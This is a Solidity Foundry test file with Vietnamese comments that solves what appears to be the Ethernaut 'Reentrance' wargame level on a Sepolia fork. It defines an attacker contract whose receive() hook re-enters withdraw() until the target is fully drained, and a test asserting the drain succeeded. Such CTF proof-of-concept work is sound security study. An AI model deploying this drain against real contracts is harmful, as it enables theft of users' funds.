// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12; // Khớp với phiên bản compiler của bài chơi

import "forge-std/Test.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
}

// 1. CONTRACT MÃ ĐỘC THỰC HIỆN TẤN CÔNG TÁI NHẬP
contract ReentrancyAttacker {
    IReentrance public target;
    uint256 public attackAmount;

    constructor(address _target) public {
        target = IReentrance(_target);
    }

    // Hàm kích hoạt cuộc tấn công ban đầu
    function attack() external payable {
        attackAmount = msg.value;

        // Bước 1: Quyên góp một lượng tiền nhỏ để tạo số dư hợp lệ trên bia ngắm
        target.donate{value: attackAmount}(address(this));

        // Bước 2: Gọi rút tiền lần đầu tiên để kích hoạt chuỗi reentrancy
        target.withdraw(attackAmount);
    }

    // HÀM NHẬN TIỀN TỰ ĐỘNG - NƠI THỰC HIỆN TÁI NHẬP (REENTRANCY)
    receive() external payable {
        // Kiểm tra xem số dư còn lại của contract mục tiêu có lớn hơn lượng tiền mỗi lần rút không
        uint256 targetBalance = address(target).balance;

        if (targetBalance >= attackAmount) {
            // Nếu mục tiêu vẫn còn tiền, tiếp tục re-enter gọi rút tiếp trước khi nó kịp trừ số dư của mình
            target.withdraw(attackAmount);
        } else if (targetBalance > 0) {
            // Nếu số tiền còn lại nhỏ hơn lượng rút thông thường, rút nốt phần cặn cuối cùng
            target.withdraw(targetBalance);
        }
    }
}

// 2. KỊCH BẢN KIỂM TOÁN TỰ ĐỘNG (FOUNDRY TEST PoC)
contract ReentrancyExploitTest is Test {
    IReentrance public targetContract;
    ReentrancyAttacker public attackerContract;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        // Thay địa chỉ Instance bài Reentrancy thực tế trên Sepolia
        targetContract = IReentrance(
            0x1234567890123456789012345678901234567890
        );

        // Triển khai contract mã độc
        attackerContract = new ReentrancyAttacker(address(targetContract));
    }

    function test_ReentrancyExploit() public {
        // Kiểm tra số dư ban đầu của contract mục tiêu (chắc chắn phải đang có tiền gửi của các nạn nhân cũ)
        uint256 initialTargetBalance = address(targetContract).balance;
        assertTrue(
            initialTargetBalance > 0,
            "Target contract must have funds to steal"
        );

        // Đóng vai trò attacker thực hiện cuộc gọi tấn công với lượng tiền bằng số dư ban đầu (hoặc nhỏ hơn tùy ý)
        // Cấp cho attacker một lượng vốn nhỏ để thực hiện bước donate mồi
        uint256 exploitValue = 0.001 ether;
        vm.deal(address(this), exploitValue);

        // Chạy lệnh tấn công xuyên phá
        attackerContract.attack{value: exploitValue}();

        // Khẳng định (Assert) rằng toàn bộ số dư của hợp đồng mục tiêu đã bị vét sạch về bằng 0
        assertEq(
            address(targetContract).balance,
            0,
            "Audit failed: Contract was not completely drained"
        );

        emit log(
            "Audit Verification: Reentrancy vulnerability successfully exploited. Contract completely drained."
        );
    }
}
